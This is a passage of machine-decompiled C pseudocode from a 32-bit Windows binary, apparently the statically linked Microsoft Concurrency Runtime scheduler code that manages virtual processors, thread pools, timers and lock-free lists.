  int (__thiscall ***v9)(_DWORD); // [esp+18h] [ebp-4h]

  result = a2;
  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"ppVirtualProcessorRoots");
LABEL_10:
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a3 )
  {
    sub_42E473(pExceptionObject, (int)"count");
    goto LABEL_10;
  }
  for ( i = 0; i < a3; ++i )
  {
    v9 = *(int (__thiscall ****)(_DWORD))(result + 4 * i);
    v6 = (**v9)(v9);
    v7 = v6;
    if ( !*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 36) + 4 * v6) + 188) )
      sub_459A31(*(volatile __int32 **)(*(_DWORD *)(this + 36) + 4 * v6));
    sub_457DDE(*(_DWORD **)(*(_DWORD *)(this + 32) + 4 * v7), (int)v9, 0);
    _InterlockedIncrement((volatile signed __int32 *)(this + 20));
    result = a2;
  }
  return result;
}

//----- (0044FAA8) --------------------------------------------------------
_DWORD *__thiscall sub_44FAA8(void *this, int a2, _DWORD *a3)
{
  _DWORD *v4; // ecx
  _DWORD *result; // eax

  v4 = operator new(0x138u);
  result = 0;
  if ( v4 )
    return sub_44EF41(v4, (int)this, a2, a3);
  return result;
}

//----- (0044FAE3) --------------------------------------------------------
_DWORD *__thiscall sub_44FAE3(void *this, int a2, int a3)
{
  int v4; // esi
  _DWORD *v5; // eax
  int v7[8]; // [esp+10h] [ebp-20h] BYREF

  v4 = 0;
  memset(v7, 0, 16);
  v5 = operator new(0x138u);
  v7[4] = (int)v5;
  v7[7] = 0;
  if ( v5 )
    return sub_44EF79(v5, (int)this, a2, v7);
  return (_DWORD *)v4;
}

//----- (0044FB2F) --------------------------------------------------------
int __thiscall sub_44FB2F(int this)
{
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( sub_4501CD() == this )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_attach_Concurrency__);
  }
  sub_44FB75((volatile signed __int32 *)this, 1);
  return sub_45269A(7, 4u, *(_DWORD *)(this + 372));
}

//----- (0044FB75) --------------------------------------------------------
_DWORD *__thiscall sub_44FB75(volatile signed __int32 *this, char a2)
{
  volatile signed __int32 **v3; // eax
  int v4; // edi
  _DWORD *v5; // esi
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  v3 = (volatile signed __int32 **)sub_44AAC3(dword_500038);
  v4 = (int)v3;
  if ( v3 )
  {
    if ( v3[7] == this )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_attach_Concurrency__);
    }
    if ( !*((_BYTE *)v3 + 76) )
      sub_458E23((int)(v3 - 1));
    sub_453143();
  }
  sub_451945(this);
  v5 = sub_4507B0((union _SLIST_HEADER *)this, a2);
  sub_4535F5(v5, v4);
  return v5;
}

//----- (0044FBE5) --------------------------------------------------------
int __thiscall sub_44FBE5(volatile signed __int32 *this)
{
  int result; // eax

  result = _InterlockedCompareExchange(this + 101, -1073741824, 0x80000000);
  if ( result == 0x80000000 )
    return sub_45238D(this);
  return result;
}

//----- (0044FC08) --------------------------------------------------------
int __thiscall sub_44FC08(int this)
{
  int result; // eax
  int **i; // ebx

  sub_4538D4();
  sub_451B1E((union _SLIST_HEADER *)this);
  result = sub_4538D4();
  for ( i = *(int ***)(this + 180); i; i = (int **)*i )
    result = (*(int (__thiscall **)(int *))(*i[1] + 24))(i[1]);
  return result;
}
// 4538D4: using guessed type int sub_4538D4(void);

//----- (0044FC46) --------------------------------------------------------
int __thiscall sub_44FC46(_DWORD *this, ULONG DueTime)
{
  int v3; // eax
  void *v4; // esi
  __int64 v6; // [esp+4h] [ebp-8h] BYREF

  v3 = sub_44CE8E();
  v4 = (void *)this[120];
  if ( v3 < 3 )
    return sub_44A677(0, v4, DueTime, 0x7FFFFFFFu);
  v6 = -10000i64 * DueTime;
  return __crtSetThreadpoolTimer(v4, &v6, 0x7FFFFFFF, 0);
}
// 4349C0: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 44CE8E: using guessed type int sub_44CE8E(void);

//----- (0044FD17) --------------------------------------------------------
unsigned int __cdecl sub_44FD17(int a1)
{
  unsigned int result; // eax
  _DWORD *v2; // esi
  _DWORD *v3; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 36) + 404) & 0xA0000000;
  if ( result != -1610612736 )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = v2 - 1;
      v2 = (_DWORD *)*v2;
      sub_44775B(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0044FD23) --------------------------------------------------------
unsigned int __cdecl sub_44FD23(int a1)
{
  unsigned int result; // eax
  _DWORD *v2; // esi
  int v3; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 36) + 404) & 0xA0000000;
  if ( result != -1610612736 )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = (int)(v2 - 13);
      v2 = (_DWORD *)*v2;
      sub_44EDE9(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0044FD2F) --------------------------------------------------------
int *sub_44FD2F()
{
  int *result; // eax

  result = (int *)_InterlockedDecrement(&dword_4F807C);
  if ( result == (int *)0x80000000 )
  {
    sub_451509();
    result = &dword_4F807C;
    _InterlockedAnd(&dword_4F807C, 0x7FFFFFFFu);
  }
  return result;
}
// 4F807C: using guessed type int dword_4F807C;

//----- (0044FD55) --------------------------------------------------------
int *sub_44FD55()
{
  int *result; // eax

  sub_44AE22(&dword_500058);
  result = (int *)(dword_500040 + 1);
  dword_500040 = (int)result;
  if ( result == (int *)1 )
  {
    if ( !dword_500098 )
      result = (int *)sub_456DA2();
    if ( dword_4F807C >= 0 )
    {
      sub_4514F5();
      result = &dword_4F807C;
      _InterlockedOr(&dword_4F807C, 0x80000000);
    }
  }
  dword_500058 = 0;
  return result;
}
// 4F807C: using guessed type int dword_4F807C;
// 500040: using guessed type int dword_500040;
// 500058: using guessed type int dword_500058;

//----- (0044FDBA) --------------------------------------------------------
char *__thiscall sub_44FDBA(int this)
{
  int v2; // esi
  int v3; // eax
  int v4; // eax
  void *v5; // ebx
  int v6; // esi
  int v7; // eax
  void *v8; // ebx
  char *v9; // ecx

  v2 = 0;
  v3 = *(_DWORD *)(this + 44);
  if ( v3 > 0 )
  {
    do
    {
      v4 = *(_DWORD *)(this + 32);
      v5 = *(void **)(v4 + 4 * v2);
      if ( v5 )
      {
        sub_457C59(*(_DWORD *)(v4 + 4 * v2));
        sub_44775B(v5);
      }
      v3 = *(_DWORD *)(this + 44);
      ++v2;
    }
    while ( v2 < v3 );
  }
  v6 = 0;
  if ( v3 > 0 )
  {
    do
    {
      v7 = *(_DWORD *)(this + 36);
      v8 = *(void **)(v7 + 4 * v6);
      if ( v8 )
      {
        sub_459A19(*(union _SLIST_HEADER **)(v7 + 4 * v6));
        sub_44775B(v8);
      }
      ++v6;
    }
    while ( v6 < *(_DWORD *)(this + 44) );
  }
  j_j__free(*(void **)(this + 92));
  j_j__free(*(void **)(this + 32));
  j_j__free(*(void **)(this + 36));
  v9 = *(char **)(this + 28);
  if ( v9 )
    sub_44F5EF(v9, 3);
  sub_44AAB5(*(_DWORD *)(this + 24));
  *(_DWORD *)(this + 24) = 0;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 424) + 4))(*(_DWORD *)(this + 424));
  return sub_4521FB();
}

//----- (0044FE6D) --------------------------------------------------------
int __thiscall sub_44FE6D(_DWORD *this)
{
  volatile __int32 *v2; // ebx
  unsigned int i; // eax
  unsigned int v4; // esi
  int result; // eax

  v2 = this + 81;
  sub_44AE12(this + 81);
  for ( i = sub_45276F(this); ; i = sub_452727(this, v4) )
  {
    v4 = i;
    result = sub_44AE53(v2);
    if ( !v4 )
      break;
    sub_44FEB0(this, v4);
    sub_44AE12(v2);
  }
  return result;
}

//----- (0044FEB0) --------------------------------------------------------
int __thiscall sub_44FEB0(int *this, unsigned int a2)
{
  _DWORD *v3; // ebx
  int v4; // eax
  unsigned int v5; // eax
  int v6; // eax
  int v7; // esi
  int result; // eax
  int v9; // ecx
  int v10; // [esp+Ch] [ebp-Ch] BYREF
  int *v11; // [esp+10h] [ebp-8h]
  _DWORD *v12; // [esp+14h] [ebp-4h]

  v10 = 0;
  v11 = &v10;
  v3 = this + 81;
  v12 = this + 81;
  sub_44AE12(this + 81);
  v4 = this[79];
  if ( v4 )
  {
    do
    {
      if ( a2 )
      {
        v5 = *(_DWORD *)(v4 + 8);
        if ( v5 < this[85] || v5 > a2 )
          break;
      }
      v6 = sub_4500E5(this + 79);
      v7 = v6 + 12;
      *(_DWORD *)(v6 + 12) = 0;
      *v11 = v6;
      v4 = this[79];
      v11 = (int *)v7;
    }
    while ( v4 );
    v3 = v12;
  }
  for ( result = sub_44AE53(v3); ; result = (*(int (__cdecl **)(_DWORD))v9)(*(_DWORD *)(v9 + 4)) )
  {
    v9 = v10;
    if ( !v10 )
      break;
    v10 = *(_DWORD *)(v10 + 12);
    if ( !v10 )
      v11 = &v10;
  }
  return result;
}

//----- (0044FF50) --------------------------------------------------------
unsigned int __thiscall sub_44FF50(_DWORD *this)
{
  int v2; // esi
  unsigned int v3; // edi
  int v4; // eax
  int v5; // ecx
  _DWORD *v6; // eax
  int v7; // eax
  unsigned int v8; // eax
  int v10; // [esp+Ch] [ebp-10h]
  int v11; // [esp+10h] [ebp-Ch]
  int v12; // [esp+14h] [ebp-8h]
  char v13; // [esp+1Bh] [ebp-1h]

  v13 = 0;
  v2 = 0;
  v3 = 0;
  v11 = 0;
  if ( (int)this[11] > 0 )
  {
    while ( 1 )
    {
      v4 = *(_DWORD *)(this[8] + 4 * v2);
      v10 = v4;
      if ( v4 )
      {
        v5 = 0;
        v12 = 0;
        if ( *(int *)(v4 + 120) > 0 )
          break;
      }
LABEL_15:
      v11 = ++v2;
      if ( v2 >= this[11] )
        return v3;
    }
    v6 = (_DWORD *)(v4 + 56);
    while ( 1 )
    {
      v7 = sub_44F5A7(v6, v5);
      if ( v7 )
      {
        v8 = *(_DWORD *)(v7 + 192);
        if ( v8 < this[85] )
          v8 = -1;
        if ( !v13 )
        {
          v13 = 1;
LABEL_12:
          v3 = v8;
          goto LABEL_13;
        }
        if ( v3 > v8 )
          goto LABEL_12;
      }
LABEL_13:
      v6 = (_DWORD *)(v10 + 56);
      v5 = v12 + 1;
      v12 = v5;
      if ( v5 >= *(_DWORD *)(v10 + 120) )
      {
        v2 = v11;
        goto LABEL_15;
      }
    }
  }
  return v3;
}

//----- (0044FFD9) --------------------------------------------------------
int __thiscall sub_44FFD9(int this, int a2)
{
  void *v3; // edx
  int result; // eax
  unsigned int v5; // edi
  unsigned int v6; // edx

  v3 = *(void **)this;
  if ( *(_DWORD *)this != *(_DWORD *)a2 )
  {
    result = sub_45188E((void **)this, *(void **)a2);
    v3 = *(void **)this;
  }
  v5 = 0;
  v6 = ((unsigned int)v3 + 31) >> 5;
  if ( v6 )
  {
    do
    {
      result = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v5);
      *(_DWORD *)(*(_DWORD *)(this + 4) + 4 * v5++) = result;
    }
    while ( v5 < v6 );
  }
  return result;
}

//----- (00450017) --------------------------------------------------------
_DWORD *sub_450017()
{
  volatile signed __int32 *v0; // ebx
  _DWORD *v1; // edi

  v0 = (volatile signed __int32 *)sub_450713();
  v1 = sub_44FB75(v0, 0);
  (*(void (__thiscall **)(volatile signed __int32 *))(*v0 + 20))(v0);
  return v1;
}

//----- (00450043) --------------------------------------------------------
int *__thiscall sub_450043(int this, _DWORD *a2)
{
  return sub_451204(this, a2);
}

//----- (0045004C) --------------------------------------------------------
int *__thiscall sub_45004C(void *this)
{
  int v2[4]; // [esp+0h] [ebp-10h] BYREF

  memset(v2, 0, sizeof(v2));
  return sub_451204((int)this, v2);
}

//----- (0045006B) --------------------------------------------------------
HANDLE *__cdecl sub_45006B(int *a1)
{
  HANDLE *v1; // eax

  sub_454A34(a1);
  sub_44FD55();
  v1 = sub_45B77B((const void **)a1);
  if ( v1 )
    return v1 + 2;
  else
    return 0;
}

//----- (00450091) --------------------------------------------------------
int __thiscall sub_450091(int this)
{
  int result; // eax

  result = _InterlockedDecrement((volatile signed __int32 *)(this + 392));
  if ( !result )
    return sub_450204((_DWORD **)this);
  return result;
}

//----- (004500AA) --------------------------------------------------------
signed __int32 __thiscall sub_4500AA(int this)
{
  signed __int32 result; // eax

  result = _InterlockedIncrement((volatile signed __int32 *)(this + 484));
  if ( result == 1 )
    return SetEvent(*(HANDLE *)(this + 472));
  return result;
}

//----- (004500C8) --------------------------------------------------------
int __thiscall sub_4500C8(int *this)
{
  int v2; // edx
  int v4; // ecx

  v2 = *this;
  if ( !*this )
    return 0;
  v4 = *(_DWORD *)(v2 + 232);
  *this = v4;
  if ( !v4 )
    this[1] = (int)this;
  return v2;
}

//----- (004500E5) --------------------------------------------------------
int __thiscall sub_4500E5(int *this)
{
  int v2; // edx
  int v4; // ecx

  v2 = *this;
  if ( !*this )
    return 0;
  v4 = *(_DWORD *)(v2 + 12);
  *this = v4;
  if ( !v4 )
    this[1] = (int)this;
  return v2;
}

//----- (004500FF) --------------------------------------------------------
int __thiscall sub_4500FF(int *this)
{
  _DWORD *v2; // esi
  int v3; // edi

  v2 = this + 2;
  sub_44AE12(this + 2);
  v3 = sub_4500C8(this);
  sub_44AE53(v2);
  return v3;
}

//----- (00450133) --------------------------------------------------------
int __thiscall sub_450133(HANDLE *this)
{
  UnregisterWaitEx(this[119], (HANDLE)0xFFFFFFFF);
  if ( sub_44CE8E() < 3 )
    sub_44A727(0, this[120], (HANDLE)0xFFFFFFFF);
  else
    sub_44AB83((int)this[120]);
  CloseHandle(this[118]);
  return sub_450091((int)this);
}
// 44CE8E: using guessed type int sub_44CE8E(void);

//----- (0045017E) --------------------------------------------------------
int __thiscall sub_45017E(volatile signed __int32 *this, struct _SINGLE_LIST_ENTRY *a2, char a3)
{
  struct _SINGLE_LIST_ENTRY *v3; // esi
  int result; // eax

  v3 = 0;
  if ( a3 )
    v3 = (struct _SINGLE_LIST_ENTRY *)sub_4535D7(a2);
  sub_451A23((int)this, a2);
  result = sub_451A65(this);
  if ( v3 )
  {
    if ( !LOBYTE(v3[19].Next) )
      return sub_4590C2(v3 - 1);
  }
  return result;
}

//----- (004501C0) --------------------------------------------------------
LPVOID sub_4501C0()
{
  return sub_44AAC3(dword_500038);
}

//----- (004501CD) --------------------------------------------------------
int sub_4501CD()
{
  _DWORD *v0; // eax

  v0 = sub_44AAC3(dword_500038);
  if ( v0 )
    return sub_43E90F(v0);
  else
    return 0;
}

//----- (004501E7) --------------------------------------------------------
int __thiscall sub_4501E7(_DWORD *this)
{
  unsigned int v1; // edx
  unsigned int i; // esi
  int result; // eax

  v1 = (unsigned int)(*this + 31) >> 5;
  for ( i = 0; i < v1; ++i )
  {
    result = this[1];
    *(_DWORD *)(result + 4 * i) = -1;
  }
  return result;
}

//----- (00450204) --------------------------------------------------------
int __thiscall sub_450204(_DWORD **this)
{
  _DWORD **v1; // ebx
  _DWORD *v2; // edi
  _DWORD *v3; // esi
  PSLIST_ENTRY v4; // eax
  int i; // edx
  int v6; // esi
  PSLIST_ENTRY v7; // eax
  int v8; // ebx
  int v9; // edi
  HANDLE *v10; // esi

  v1 = this;
  (*(void (__thiscall **)(_DWORD *))(*this[107] + 4))(this[107]);
  CloseHandle(v1[95]);
  v2 = (_DWORD *)_InterlockedExchange((volatile __int32 *)v1 + 45, 0);
  if ( v2 )
  {
    do
    {
      v3 = (_DWORD *)*v2;
      sub_44EDC4(v2[1]);
      sub_44775B(v2);
      v2 = v3;
    }
    while ( v3 );
  }
  v4 = InterlockedFlushSList((PSLIST_HEADER)v1 + 62);
  for ( i = v4 != 0 ? (unsigned int)&v4[-1] : 0; i; i = v6 != 0 ? v6 - 4 : 0 )
  {
    v6 = *(_DWORD *)(i + 4);
    sub_44EDA1(i);
  }
  v7 = InterlockedFlushSList((PSLIST_HEADER)v1 + 63);
  if ( (v7 != 0 ? (unsigned int)&v7[-3] : 0) != 0 )
  {
    v8 = v7 != 0 ? (unsigned int)&v7[-3] : 0;
    do
    {
      v9 = *(_DWORD *)(v8 + 12) != 0 ? *(_DWORD *)(v8 + 12) - 12 : 0;
      (**(void (__thiscall ***)(int, int))v8)(v8, 1);
      v8 = v9;
    }
    while ( v9 );
    v1 = this;
  }
  sub_45269A(2, 4u, (int)v1[93]);
  while ( v1[46] )
  {
    v10 = (HANDLE *)sub_451E16((int)(v1 + 46));
    SetEvent(v10[2]);
    CloseHandle(v10[2]);
    sub_44775B(v10);
  }
  return ((int (__thiscall *)(_DWORD **, int))**v1)(v1, 1);
}

//----- (0045032E) --------------------------------------------------------
_DWORD *__thiscall sub_45032E(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  _DWORD *result; // eax

  v4 = sub_450CAF((int)a2, *this);
  result = sub_451410(this, a2, v4);
  if ( !result )
    return 0;
  if ( a3 )
    *a3 = result[2];
  return result;
}

//----- (00450364) --------------------------------------------------------
int __thiscall sub_450364(void *this)
{
  int v2; // edi
  void **v3; // eax
  void **v4; // esi

  v2 = 0;
  v3 = (void **)sub_44AAC3(dword_500038);
  v4 = v3;
  if ( v3 && v3[7] == this && !*((_BYTE *)v3 + 76) )
  {
    UserMathErrorFunction();
    v2 = *((_DWORD *)v4[39] + 20);
    UserMathErrorFunction();
  }
  return v2;
}

//----- (004503A5) --------------------------------------------------------
int __thiscall sub_4503A5(unsigned int *this, _DWORD *a2)
{
  int v3; // esi
  int v5; // [esp+8h] [ebp-8h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v3 = 0;
  if ( (*a2 & 0xFFFFFFF) == 2 )
    return *(_DWORD *)(this[8] + 4 * a2[2]);
  if ( (*a2 & 0xFFFFFFF) == 3 )
  {
    v6 = a2[2];
    if ( sub_45032E(this + 87, &v6, &v5) )
      return *(_DWORD *)(this[8] + 4 * v5);
  }
  return v3;
}

//----- (004503FE) --------------------------------------------------------
int __stdcall sub_4503FE(int a1, int a2, _DWORD *a3, _DWORD *a4)
{
  int result; // eax

  for ( result = 0; a1 < a2 && !result; result = sub_44F5A7(a4, a1++) )
    ;
  *a3 = a1 - 1;
  return result;
}

//----- (00450429) --------------------------------------------------------
int __thiscall sub_450429(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  for ( result = 0; a2 < a3 && !result; result = sub_44F5A7(this + 14, a2++) )
    ;
  *a4 = a2 - 1;
  return result;
}

//----- (00450458) --------------------------------------------------------
char __thiscall sub_450458(unsigned int *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7)
{
  char v7; // bl
  _DWORD *v9; // esi
  int v10; // esi
  int v11; // eax
  unsigned int v12; // eax
  _DWORD *v13; // esi
  int v14; // esi
  _DWORD *v15; // ecx
  int v17; // [esp-14h] [ebp-2Ch] BYREF
  int v18; // [esp-10h] [ebp-28h]
  int v19; // [esp-Ch] [ebp-24h]
  int v20; // [esp-8h] [ebp-20h]
  int v21; // [esp-4h] [ebp-1Ch]
  int v22; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  v7 = 1;
  if ( (a3 & 0xFFFFFFF) == 1 )
  {
    v10 = 0;
    v11 = this[7] + 16 * a5;
    v22 = v11;
    for ( i = 0; v10 < (int)this[11]; i = v10 )
    {
      if ( ((1 << (v10 & 0x1F)) & *(_DWORD *)(*(_DWORD *)(v11 + 4) + 4 * ((unsigned int)v10 >> 5))) != 0 )
      {
        v12 = this[8];
        v21 = a7;
        v13 = *(_DWORD **)(v12 + 4 * v10);
        sub_452901(&v17, &a3);
        if ( sub_457FD1(v13, a2, v17, v18, v19, v20, v21) )
          return v7;
        v10 = i;
      }
      v11 = v22;
      ++v10;
    }
  }
  else if ( (a3 & 0xFFFFFFFu) - 2 <= 1 )
  {
    v9 = (_DWORD *)sub_4503A5(this, &a3);
    if ( v9 )
    {
      v21 = a7;
      sub_452901(&v17, &a3);
      if ( sub_457FD1(v9, a2, v17, v18, v19, v20, v21) )
        return v7;
    }
  }
  v14 = 0;
  if ( (int)this[11] <= 0 )
    return 0;
  while ( 1 )
  {
    v15 = *(_DWORD **)(this[8] + 4 * v14);
    if ( v15 )
    {
      if ( (int)v15[7] > 0 && sub_457FD1(v15, a2, 0, 0, 0, 0, a7) )
        break;
    }
    if ( ++v14 >= (int)this[11] )
      return 0;
  }
  return v7;
}

//----- (00450560) --------------------------------------------------------
char __thiscall sub_450560(_DWORD *this)
{
  _DWORD *v1; // ecx
  char v2; // dl

  v1 = (_DWORD *)this[45];
  v2 = 0;
  while ( v1 )
  {
    if ( !*(_BYTE *)(v1[1] + 236) && *(_DWORD *)(v1[1] + 44) )
      return 1;
    v1 = (_DWORD *)*v1;
  }
  return v2;
}

//----- (0045058A) --------------------------------------------------------
char __thiscall sub_45058A(_DWORD *this)
{
  int v2; // ecx
  char v3; // bl
  int *v4; // esi
  int v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v8; // edi
  _DWORD *v9; // eax
  _DWORD *v11; // [esp+4h] [ebp-Ch]
  void *v12; // [esp+8h] [ebp-8h]
  void *v13; // [esp+8h] [ebp-8h]
  int v14; // [esp+Ch] [ebp-4h]

  v2 = 0;
  v3 = 0;
  v11 = this;
  v14 = 0;
  if ( (int)this[11] <= 0 )
    return v3;
  while ( 1 )
  {
    v4 = *(int **)(this[9] + 4 * v2);
    if ( v4 )
      break;
LABEL_19:
    this = v11;
    v14 = ++v2;
    if ( v2 >= v11[11] )
      return v3;
  }
  v5 = 0;
  if ( v4[20] <= 0 )
  {
LABEL_10:
    if ( v3 )
      return v3;
    v8 = 0;
    if ( v4[40] > 0 )
    {
      while ( 1 )
      {
        v9 = (_DWORD *)sub_44F5A7(v4 + 24, v8);
        v13 = v9;
        if ( v9 )
        {
          if ( sub_45A7A0(v9) || sub_45A7A8(v13) )
            break;
        }
        if ( ++v8 >= v4[40] )
          goto LABEL_18;
      }
      v3 = 1;
LABEL_18:
      v2 = v14;
    }
    goto LABEL_19;
  }
  v6 = v4 + 4;
  while ( 1 )
  {
    v7 = (_DWORD *)sub_44F5A7(v6, v5);
    v12 = v7;
    if ( v7 )
    {
      if ( sub_45A7A0(v7) || sub_45A7A8(v12) )
        return 1;
    }
    ++v5;
    v6 = v4 + 4;
    if ( v5 >= v4[20] )
    {
      v2 = v14;
      goto LABEL_10;
    }
  }
}

//----- (00450654) --------------------------------------------------------
int __thiscall sub_450654(_DWORD *this)
{
  return *(_DWORD *)(sub_4509F4(this) + 8);
}

//----- (0045065D) --------------------------------------------------------
_DWORD *__thiscall sub_45065D(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  unsigned int v10; // [esp+10h] [ebp-18h] BYREF
  int v11[5]; // [esp+14h] [ebp-14h] BYREF

  v4 = sub_44CE93();
  sub_44EFC9(a2, v4);
  v11[4] = 0;
  v11[1] = 1;
  v5 = *a3 & 0xFFFFFFF;
  if ( !v5 )
  {
    sub_4501E7(a2);
    return a2;
  }
  v6 = v5 - 1;
  if ( !v6 )
  {
    v8 = 16 * a3[2] + 8 + this[7];
    goto LABEL_8;
  }
  v7 = v6 - 1;
  if ( !v7 )
  {
    v8 = *(_DWORD *)(this[8] + 4 * a3[2]) + 8;
LABEL_8:
    sub_44FFD9((int)a2, v8);
    return a2;
  }
  if ( v7 == 1 )
  {
    v11[0] = a3[2];
    sub_45032E(this + 90, v11, &v10);
    *(_DWORD *)(a2[1] + 4 * (v10 >> 5)) |= 1 << (v10 & 0x1F);
  }
  return a2;
}

//----- (00450713) --------------------------------------------------------
int sub_450713()
{
  int result; // eax
  char v1; // [esp+0h] [ebp-24h]
  void *v2[3]; // [esp+14h] [ebp-10h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  sub_44AE22(&dword_50005C);
  v3 = 0;
  if ( !dword_500030 || !sub_452040((volatile signed __int32 *)dword_500030) )
  {
    sub_4546FD(v2, 0, v1);
    LOBYTE(v3) = 1;
    if ( dword_500034 )
      sub_45479F(v2, (const void **)dword_500034);
    dword_500030 = (int)sub_45006B((int *)v2);
    sub_450CE2((_DWORD *)dword_500030);
    (*(void (__thiscall **)(int))(*(_DWORD *)dword_500030 + 16))(dword_500030);
    sub_454793(v2);
  }
  result = dword_500030;
  dword_50005C = 0;
  return result;
}
// 450749: variable 'v1' is possibly undefined
// 500030: using guessed type int dword_500030;
// 500034: using guessed type int dword_500034;
// 50005C: using guessed type int dword_50005C;

//----- (004507B0) --------------------------------------------------------
_DWORD *__thiscall sub_4507B0(union _SLIST_HEADER *this, char a2)
{
  PSLIST_ENTRY v3; // eax
  int v4; // esi
  _DWORD *v5; // eax

  v3 = InterlockedPopEntrySList(this + 62);
  v4 = v3 != 0 ? (unsigned int)&v3[-1] : 0;
  if ( v4 )
  {
    sub_45B4C7(v4, a2);
  }
  else
  {
    v5 = operator new(0xB0u);
    if ( v5 )
      return sub_45B22D(v5, (int)this, a2);
  }
  return (_DWORD *)v4;
}

//----- (00450810) --------------------------------------------------------
int __thiscall sub_450810(int this, char a2)
{
  char v3; // bl
  int result; // eax
  unsigned int v5; // esi
  PSLIST_ENTRY v6; // eax
  _DWORD *v7; // ebx

  v3 = a2;
  if ( a2 )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)this + 88))(this) )
    {
      result = sub_450ADF((union _SLIST_HEADER *)this);
      if ( result )
        return result;
    }
    v5 = sub_452598((_DWORD *)this, 1);
    if ( v5 )
    {
      if ( (unsigned int)j____crtGetTickCount64() - *(_DWORD *)(this + 464) < v5 )
        return 0;
      v3 = 0;
    }
  }
  _InterlockedIncrement((volatile signed __int32 *)(this + 400));
  if ( !v3 )
    *(_QWORD *)(this + 464) = j____crtGetTickCount64();
  v6 = InterlockedPopEntrySList((PSLIST_HEADER)(this + 488));
  v7 = v6 != 0 ? (_DWORD *)&v6[-2] : 0;
  if ( !v7 )
  {
    v7 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)this + 64))(this);
    sub_44F94C((volatile signed __int32 *)this, (int)v7);
    _InterlockedIncrement((volatile signed __int32 *)(this + 392));
  }
  sub_45915F(v7);
  v7[39] = 0;
  (*(void (__thiscall **)(_DWORD, _DWORD *))(**(_DWORD **)(this + 428) + 8))(*(_DWORD *)(this + 428), v7);
  if ( v7 )
  {
    v7[4] = 0;
    v7[5] = 0;
  }
  return (int)v7;
}
// 44A95D: using guessed type __int64 j____crtGetTickCount64(void);

//----- (00450933) --------------------------------------------------------
signed __int32 __thiscall sub_450933(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 82);
}

//----- (00450940) --------------------------------------------------------
signed __int32 __thiscall sub_450940(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 83);
}

//----- (0045095A) --------------------------------------------------------
int __thiscall sub_45095A(int this)
{
  volatile signed __int32 *v2; // edi
  int v3; // eax
  int v4; // esi

  v2 = (volatile signed __int32 *)(this + 308);
  sub_44A220((volatile signed __int32 *)(this + 308));
  v3 = sub_451DCA((int *)(this + 304));
  v4 = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 12) = 1;
  sub_44A33A(v2);
  return v4;
}

//----- (0045098F) --------------------------------------------------------
int __stdcall sub_45098F(_DWORD *a1, int a2, _DWORD *a3)
{
  int v3; // edx
  int result; // eax

  v3 = *a1 + 1;
  if ( v3 <= a2 )
    return sub_4503FE(v3, a2, a1, a3);
  result = sub_4503FE(v3, a3[16], a1, a3);
  v3 = 0;
  if ( !result )
    return sub_4503FE(v3, a2, a1, a3);
  return result;
}

//----- (004509CB) --------------------------------------------------------
int __thiscall sub_4509CB(_DWORD *this, int a2, int a3)
{
  int v3; // esi
  int v4; // eax

  v3 = this[9];
  v4 = sub_450A15(this, *(_DWORD *)(a3 + 184));
  return a2 != *(_DWORD *)(v3 + 4 * v4) ? *(_DWORD *)(v3 + 4 * v4) : 0;
}

//----- (004509F4) --------------------------------------------------------
int __thiscall sub_4509F4(_DWORD *this)
{
  int v1; // esi
  int v3; // [esp-4h] [ebp-Ch]

  v3 = this[94];
  v1 = *(_DWORD *)(this[9] + 4 * v3);
  this[94] = sub_450A15(this, v3);
  return v1;
}

//----- (00450A15) --------------------------------------------------------
int __thiscall sub_450A15(_DWORD *this, int a2)
{
  do
    a2 = (a2 + 1) % this[11];
  while ( !*(_DWORD *)(*(_DWORD *)(this[9] + 4 * a2) + 188) );
  return a2;
}

//----- (00450A37) --------------------------------------------------------
int __thiscall sub_450A37(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // edx
  int result; // eax

  v4 = *a2 + 1;
  if ( v4 <= a3 )
    return sub_450429(this, v4, a3, a2);
  result = sub_450429(this, v4, this[30], a2);
  v4 = 0;
  if ( !result )
    return sub_450429(this, v4, a3, a2);
  return result;
}

//----- (00450A6C) --------------------------------------------------------
_DWORD *__thiscall sub_450A6C(const void **this, _DWORD *a2)
{
  sub_45471B(a2, this + 1);
  return a2;
}

//----- (00450A82) --------------------------------------------------------
